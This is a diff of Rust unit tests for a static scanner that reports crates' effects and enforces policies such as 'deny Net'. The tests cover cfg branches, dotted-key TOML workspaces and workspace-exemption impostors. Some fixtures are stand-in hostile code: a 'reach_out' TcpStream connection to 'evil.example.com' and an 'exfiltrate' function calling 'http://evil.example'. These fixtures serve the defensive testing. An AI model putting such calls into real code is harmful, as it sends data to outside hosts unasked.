@@ -2094,6 +2094,44 @@ pub fn mk() -> W<A> { W { t: A } }
                  asserts on both targets what is true on one:\n{dep}");
     }
 
+    /// ⟨2026-08-29 ADVERSARIAL REVIEW, finding 2 — MEASURED AND ACCEPTED, NOT FIXED, see the doc note at
+    /// `blind_direct`'s insertion site in scan.rs for the full argument⟩ Two `#[cfg(...)]` branches of one
+    /// same-named function — cargo-util's real `crates/cargo-util/src/paths.rs` shape, a
+    /// `#[cfg(target_os = "macos")]` body calling an unmodelled FFI crate beside a `#[cfg(not(...))]`
+    /// no-op stub — print TWO entries (by design: `a_qualified_name_carried_by_two_cfg_gated_units_yields_one_violation_not_two`
+    /// pins that the report must keep one entry per declaration, own `loc` each), and BOTH carry the SAME
+    /// `invisible` disclosure because `blind_direct` is keyed on the bare qualified name the two branches
+    /// share. THIS TEST PINS THE ACCEPTED SHAPE so a future change either preserves it deliberately or
+    /// revisits this decision explicitly, rather than drifting: the union is a TRUE, SAFE-DIRECTION
+    /// statement about the name ("`get_thing` reaches `core_foundation` under some configuration") and
+    /// never hides a real effect — over-report noise, not the family's cardinal sin.
+    #[test]
+    fn cfg_branch_pair_shares_one_invisible_disclosure_stated_residual() {
+        let v = scan_crate_chained("cfgcollide", "cfgvictim", "\n[dependencies]\ncore-foundation = \"0.9\"\n", "\
+#[cfg(target_os = \"macos\")]
+pub fn get_thing() {
+    core_foundation::something();
+}
+
+#[cfg(not(target_os = \"macos\"))]
+pub fn get_thing() {
+    // no-op stub
+}
+", &DepIndex::default());
+        let matches: Vec<&serde_json::Value> = v["functions"].as_array().unwrap()
+            .iter().filter(|f| f["fn"].as_str() == Some("get_thing")).collect();
+        assert_eq!(matches.len(), 2,
+            "TWO cfg branches of one same-named function report as TWO entries — pinned by \
+             `a_qualified_name_carried_by_two_cfg_gated_units_yields_one_violation_not_two`, which asserts \
+             the report must not lose either declaration:\n{v:#}");
+        for m in &matches {
+            assert_eq!(m["invisible"], serde_json::json!(["core_foundation"]),
+                "STATED RESIDUAL: both branches share the disclosure (the bare-qual-keyed union), \
+                 including the stub that provably makes no such call — safe-direction over-report, \
+                 never a hidden effect:\n{v:#}");
+        }
+    }
+
     #[test]
     fn type_surface_publishes_a_generic_instantiation_but_still_not_a_wrapper() {
         let dep = scan_crate_chained("gen", "deplib", "", "\
@@ -6532,25 +6570,36 @@ trait G {
 
     #[test]
     fn toml_primitives_tolerate_spacing_and_comments() {
-        // The shared toml_section/toml_scalar fix a latent inconsistency: a `[ spaced ]` header and a
-        // trailing `# comment` are now handled uniformly across all three manifest readers.
+        // `toml_section` survives the line-based -> real-TOML migration (deps.rs's tier note) because
+        // `lang.rs`'s `parse_features` still uses it for `[features]`.
         assert_eq!(toml_section("[ workspace ]"), Some("workspace"));
         assert_eq!(toml_section("[package]"), Some("package"));
         assert_eq!(toml_section("name = \"x\""), None);
-        assert_eq!(toml_scalar("name = \"my-crate\"  # the name", "name"), Some("my-crate"));
-        assert_eq!(toml_scalar("name=bare # c", "name"), Some("bare"));
-        assert_eq!(toml_scalar("namespace = \"x\"", "name"), None); // key is whole, not a prefix
-        // read_crate_name through a spaced header + comment.
+        // read_crate_name is now a real-TOML reader (`read_manifest_table`) — still tolerates a spaced
+        // header + a trailing comment, because the `toml` crate does.
         let d = std::env::temp_dir().join(format!("candor-scan-tomlhdr-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&d);
         std::fs::create_dir_all(&d).unwrap();
         std::fs::write(d.join("Cargo.toml"), "[ package ]\nname = \"spaced-crate\"  # trailing\n").unwrap();
         assert_eq!(read_crate_name(&d).as_deref(), Some("spaced_crate"));
-        // toml_string_array through a spaced [ workspace ] header.
-        assert_eq!(
-            toml_string_array("[ workspace ]\nmembers = [\"a\", \"b\"]\n", "workspace", "members"),
-            vec!["a", "b"]
-        );
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// ⟨finding 3, 2026-08-29⟩ `read_crate_name` via `package.name = "…"` (dotted key) — the SAME
+    /// structure as `[package]\nname = "…"` to a real parser. Pre-fix this returned `None`, and
+    /// `scan_target`'s `if read_crate_name(dir).is_some() { dirs.push(dir) }` silently dropped the root
+    /// package from the workspace fan-out: reproduced live, a root `pub fn root_net()` performing a real
+    /// `TcpStream::connect` vanished completely (absent from `functions`, absent from `excluded`, zero
+    /// stderr) and `--policy "deny Net"` exited 0.
+    #[test]
+    fn read_crate_name_recognizes_dotted_key_package_table() {
+        let d = std::env::temp_dir().join(format!("candor-scan-dottedpkg-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&d);
+        std::fs::create_dir_all(&d).unwrap();
+        std::fs::write(d.join("Cargo.toml"), "package.name = \"root-pkg\"\npackage.version = \"0.1.0\"\n")
+            .unwrap();
+        assert_eq!(read_crate_name(&d).as_deref(), Some("root_pkg"),
+            "a dotted-key `package.name` must be read exactly like a header-table `[package]` one");
         let _ = std::fs::remove_dir_all(&d);
     }
 
@@ -6570,12 +6619,64 @@ trait G {
     }
 
     #[test]
-    fn toml_string_array_reads_inline_and_multiline_members() {
-        let txt = "[package]\nname = \"x\"\n\n[workspace]\nmembers = [\"crates/a\", \"crates/b\"]\nexclude = [\n  \"eval\",\n  \"sample\",\n]\n";
-        assert_eq!(toml_string_array(txt, "workspace", "members"), vec!["crates/a", "crates/b"]);
-        assert_eq!(toml_string_array(txt, "workspace", "exclude"), vec!["eval", "sample"]);
-        assert!(toml_string_array(txt, "workspace", "default-members").is_empty());
-        assert!(toml_string_array("[dependencies]\nserde = \"1\"\n", "workspace", "members").is_empty());
+    fn workspace_members_reads_inline_and_multiline_arrays_via_real_toml() {
+        // Replaces the deleted `toml_string_array`'s direct unit test: the members/exclude ARRAY reading
+        // is now exercised through `workspace_members` itself (real TOML), the only production caller.
+        let d = std::env::temp_dir().join(format!("candor-scan-wsarrays-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&d);
+        std::fs::create_dir_all(d.join("crates/a")).unwrap();
+        std::fs::create_dir_all(d.join("crates/b")).unwrap();
+        std::fs::create_dir_all(d.join("eval")).unwrap();
+        for m in ["crates/a", "crates/b", "eval"] {
+            std::fs::write(d.join(m).join("Cargo.toml"), "[package]\nname = \"m\"\n").unwrap();
+        }
+        std::fs::write(d.join("Cargo.toml"),
+            "[package]\nname = \"x\"\n\n[workspace]\nmembers = [\"crates/a\", \"crates/b\", \"eval\"]\n\
+             exclude = [\n  \"eval\",\n  \"sample\",\n]\n"
+        ).unwrap();
+        let got: Vec<String> = workspace_members(&d)
+            .into_iter()
+            .map(|p| p.strip_prefix(&format!("{}/", d.to_string_lossy())).unwrap().to_string())
+            .collect();
+        assert_eq!(got, vec!["crates/a", "crates/b"], "multi-line `exclude` array honoured via real TOML");
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// ⟨finding 3, 2026-08-29⟩ THE REPRODUCED DEFECT: a workspace declared via dotted keys
+    /// (`workspace.members = […]`) rather than a `[workspace]` header — real, `cargo metadata`-resolved
+    /// TOML — made `has_workspace_table` return `false` and `workspace_members` return empty. Pre-fix,
+    /// scanning this root fell through to a single package-less crate scan: `analyzed.count: 0`, zero
+    /// stderr, and a `--policy "deny Net"` gate over the member's real Net call printed "policy ✓" at
+    /// exit 0. Fixed by moving both functions onto the real `toml` parser already used for the
+    /// dependency-identity surface (⟨caca530⟩/⟨75045f0⟩) — a dotted key and a header section parse to
+    /// the identical structure there.
+    #[test]
+    fn dotted_key_workspace_declaration_is_recognized() {
+        let d = std::env::temp_dir().join(format!("candor-scan-dottedws-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&d);
+        std::fs::create_dir_all(d.join("member/src")).unwrap();
+        std::fs::write(d.join("Cargo.toml"), "workspace.members = [\"member\"]\n").unwrap();
+        std::fs::write(d.join("member/Cargo.toml"), "[package]\nname = \"member\"\nversion = \"0.1.0\"\n")
+            .unwrap();
+        std::fs::write(d.join("member/src/lib.rs"),
+            "pub fn reach_out() { let _ = std::net::TcpStream::connect(\"evil.example.com:80\"); }\n"
+        ).unwrap();
+        assert!(has_workspace_table(&d), "a dotted-key `workspace.members` must be recognized as [workspace]");
+        let members: Vec<String> = workspace_members(&d)
+            .into_iter()
+            .map(|p| p.strip_prefix(&format!("{}/", d.to_string_lossy())).unwrap().to_string())
+            .collect();
+        assert_eq!(members, vec!["member"], "the dotted-key member list must resolve exactly like a header one");
+        // End-to-end: the CLI-visible shape a real `--policy` run would see.
+        let idx = load_dep_reports(None);
+        let prefix = d.join("out/r").to_string_lossy().into_owned();
+        let rc = scan_target(&d.to_string_lossy(), prefix.clone(), false, false, None, None, &idx, &crate::gate::begin_run());
+        assert_eq!(rc, 0, "scan should succeed");
+        let report = std::fs::read_to_string(format!("{prefix}.member.scan.json"))
+            .expect("the dotted-key workspace must fan out to its member, not vanish into a single-crate scan");
+        assert!(report.contains("reach_out") && report.contains("Net"),
+            "the member's real Net call must be analyzed, not silently skipped: {report}");
+        let _ = std::fs::remove_dir_all(&d);
     }
 
     #[test]
@@ -7833,6 +7934,76 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
             "a dotted-key BARE VERSION dependency is ordinary honest TOML — must keep the exemption \
              unchanged, never new over-charge noise:\n{v:#}");
         let _ = std::fs::remove_dir_all(&dotted_honest);
+    }
+
+    /// ⟨2026-08-29 ADVERSARIAL REVIEW, finding 1⟩ `find_workspace_root` used to return the nearest
+    /// `[workspace]`-declaring ANCESTOR unconditionally, on the argument (now corrected — see the doc on
+    /// `find_workspace_root`) that a directory sitting under an unrelated real workspace by mere
+    /// filesystem POSITION "cannot manufacture a false exemption" because cargo would refuse to build the
+    /// layout. Reproduced live: a `vendor/fake-lib` directory that is NOT a declared member of the outer
+    /// workspace (not in `members`, would fail `cargo metadata` if built there) declares
+    /// `log = { workspace = true }` and performs a real, unmodelled effectful call; the outer root
+    /// happens to ALSO declare an unrelated, genuine `log = "0.4"` — ancestry, not membership, let the
+    /// walk resolve against it and grant the `CALIBRATED_CRATES` exemption to an impostor the outer
+    /// workspace has nothing to do with.
+    #[test]
+    fn workspace_ancestor_name_coincidence_without_membership_still_discloses() {
+        let base = |tag: &str| std::env::temp_dir().join(format!("candor-collide3-{tag}-{}", std::process::id()));
+        let scan = |dir: &std::path::Path| -> serde_json::Value {
+            let idx = DepIndex::default();
+            let (rc, body) = scan_one(&dir.to_string_lossy(), ScanOpts {
+                prefix: String::new(), want_json: true, include_tests: false, policy: None,
+                baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
+            }, &crate::gate::begin_run());
+            assert_eq!(rc, 0, "scan should succeed:\n{body:?}");
+            serde_json::from_str(&body.unwrap()).unwrap()
+        };
+
+        // THE OUTER, REAL workspace: `real-member` is its only declared member. Its `[workspace.dependencies]`
+        // carries a genuine, unrelated, bare-version `log` — an ordinary honest entry that has nothing to
+        // do with `vendor/fake-lib` below.
+        let root = base("outer");
+        let _ = std::fs::remove_dir_all(&root);
+        std::fs::create_dir_all(root.join("real-member/src")).unwrap();
+        std::fs::create_dir_all(root.join("vendor/fake-lib/src")).unwrap();
+        std::fs::write(root.join("Cargo.toml"),
+            "[workspace]\nmembers = [\"real-member\"]\n\n[workspace.dependencies]\nlog = \"0.4\"\n"
+        ).unwrap();
+        std::fs::write(root.join("real-member/Cargo.toml"), "[package]\nname = \"real-member\"\nversion = \"0.1.0\"\n").unwrap();
+        std::fs::write(root.join("real-member/src/lib.rs"), "pub fn noop() {}\n").unwrap();
+        // `vendor/fake-lib`: NOT listed in the outer workspace's `members`, so `cargo metadata` run there
+        // would refuse it — but candor-scan reads source without building, and this fix must not let mere
+        // ancestry substitute for membership.
+        std::fs::write(root.join("vendor/fake-lib/Cargo.toml"),
+            "[package]\nname = \"fake-lib\"\nversion = \"0.1.0\"\n[dependencies]\nlog = { workspace = true }\n"
+        ).unwrap();
+        std::fs::write(root.join("vendor/fake-lib/src/lib.rs"),
+            "pub fn exfiltrate() { log::totally_unmodelled_tail(\"http://evil.example\"); }\n"
+        ).unwrap();
+
+        let v = scan(&root.join("vendor/fake-lib"));
+        assert!(!v["functions"].as_array().unwrap().is_empty(),
+            "a non-member subtree resolving `workspace = true` against an unrelated ancestor's coincidentally \
+             same-named dependency must not vanish entirely (\"functions\": []):\n{v:#}");
+        assert_eq!(fn_entry(&v, "exfiltrate")["invisible"], serde_json::json!(["log"]),
+            "must disclose `log` invisible rather than silently granting the ancestor's exemption:\n{v:#}");
+        assert!(effs(fn_entry(&v, "exfiltrate")).is_empty(),
+            "NO FABRICATION — the impostor's real effect must never be guessed:\n{v:#}");
+
+        // OVER-CHARGE GUARD: a GENUINE member (`real-member`) inheriting a GENUINE, honest
+        // `workspace = true` registry dependency from the SAME outer root must stay byte-identical — this
+        // fix must not cost an honest workspace member anything.
+        std::fs::write(root.join("real-member/Cargo.toml"),
+            "[package]\nname = \"real-member\"\nversion = \"0.1.0\"\n[dependencies]\nlog = { workspace = true }\n"
+        ).unwrap();
+        std::fs::write(root.join("real-member/src/lib.rs"),
+            "pub fn exfiltrate() { log::totally_unmodelled_tail(\"http://evil.example\"); }\n"
+        ).unwrap();
+        let v = scan(&root.join("real-member"));
+        assert!(v["functions"].as_array().unwrap().is_empty(),
+            "a GENUINE member's honest workspace-inherited registry dependency must keep the exemption \
+             unchanged — the over-charge this fix must never commit:\n{v:#}");
+        let _ = std::fs::remove_dir_all(&root);
     }
 
     /// R59-CLASS PROBE (the ~79-crate audit `3cb1906`'s own commit message named as still open):
